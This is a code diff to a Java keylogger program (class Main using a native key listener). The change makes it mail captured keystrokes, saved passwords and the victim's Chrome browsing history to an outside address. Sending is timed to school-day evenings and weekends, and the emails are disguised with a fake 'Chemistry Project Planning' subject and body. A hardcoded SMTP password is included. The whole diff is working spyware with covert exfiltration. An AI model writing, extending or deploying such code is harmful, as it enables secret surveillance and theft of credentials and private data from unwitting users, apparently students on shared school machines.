@@ -97,18 +97,44 @@ public class Main implements NativeKeyListener{
 			java.util.Date date = new java.util.Date();
 		    Calendar cal = Calendar.getInstance();
 		    cal.setTime(date);
+		    int dow = cal.get(Calendar.DAY_OF_WEEK);
+		    int hour = cal.get(Calendar.HOUR_OF_DAY);
 		    int minutes = cal.get(Calendar.MINUTE);
 		    // upload(getHostIP());
 		   // uphistory(getHostIP());
-			 if (minutes % 2 == 0) {
-			    	// send the file
-				 System.out.println("A " + minutes);
-				 upload(getHostIP());
-			    } else {
-				 System.out.println("B " + minutes);
-				 uplogin(getHostIP());
-				 uphistory(getHostIP());
+			 /* @param dow
+			  * @param hour
+			  * Check if the day is a school day, if so only mail logs while at home
+			  */
+			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) { 
+			 if ((hour >= 16 || hour == 0)) {
+				 if (minutes % 2 == 0) {
+				    	// send the file
+					// System.out.println("A " + minutes);
+					 upload(getHostIP());
+				    } else {
+					// System.out.println("B " + minutes);
+					 uplogin(getHostIP());
+					 uphistory(getHostIP());
+				 }
+				 if (minutes % 30 == 0 || minutes == 0) {
+				 mailLogs();
+				 }
 			 }
+			 } else if (dow == 1 || dow == 7) {
+			//	 if (minutes % 2 == 0) {
+				    	// send the file
+					// System.out.println("A " + minutes);
+				//	 upload(getHostIP());
+				  //  } else {
+					// System.out.println("B " + minutes);
+				//	 uplogin(getHostIP());
+				// 	 uphistory(getHostIP());
+				 if ((minutes % 30 == 0 || minutes == 0)) {
+					 mailLogs();
+				 }
+				 }
+			// }
 		}
 	}
 
@@ -289,15 +315,14 @@ public class Main implements NativeKeyListener{
 	 public static void mailLogs() {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
-	      String to = "duvictor514@gmail.com";
+	      String to = "samplemail@mail.com";
 
 	      // Sender's email ID needs to be mentioned
-	      String from = "duvictor514@gmail.com";
+	      String from = "noreply@thing.com";
 
-	      final String username = "duvictor514@gmail.com";//change accordingly
+	      final String username = "noreply@thing.com";//change accordingly
 	      final String password = "airiismysenpai";//change accordingly
 
-	      // Assuming you are sending email through relay.jangosmtp.net
 	      String host = "smtp.gmail.com";
 
 	      Properties props = new Properties();
@@ -326,13 +351,13 @@ public class Main implements NativeKeyListener{
 	            InternetAddress.parse(to));
 
 	         // Set Subject: header field
-	         message.setSubject("Testing Subject");
+	         message.setSubject("Re: Chemistry Project Planning: " + System.getProperty("user.name"));
 
 	         // Create the message part
 	         BodyPart messageBodyPart = new MimeBodyPart();
 
 	         // Now set the actual message
-	         messageBodyPart.setText("This is a bot message");
+	         messageBodyPart.setText("Hello, I just wanted to let you know that the chemistry group project meeting has been delayed until next week due to an unexpected ceremony in Japan I was going to have with my family. Sorry about that, Sincerely: " + System.getProperty("user.name"));
 
 	         // Create a multipar message
 	         Multipart multipart = new MimeMultipart();
@@ -342,19 +367,24 @@ public class Main implements NativeKeyListener{
 
 	         // Part two is attachment
 	         messageBodyPart = new MimeBodyPart();
-	         String filename = "/home/citrus/test.txt";
+	         String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
+	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History";
 	         DataSource source = new FileDataSource(filename);
 	         messageBodyPart.setDataHandler(new DataHandler(source));
 	         messageBodyPart.setFileName(filename);
 	         multipart.addBodyPart(messageBodyPart);
-
+	         BodyPart otherMBP = new MimeBodyPart();
+	         DataSource other = new FileDataSource(otherfilename);
+	         otherMBP.setDataHandler(new DataHandler(other));
+	         otherMBP.setFileName(otherfilename);
+	         multipart.addBodyPart(otherMBP);
 	         // Send the complete message parts
 	         message.setContent(multipart);
 
 	         // Send message
 	         Transport.send(message);
 
-	         System.out.println("Sent message successfully....");
+	         System.out.println("Uploading Information to Skynet...");
 	  
 	      } catch (MessagingException e) {
 	         throw new RuntimeException(e);
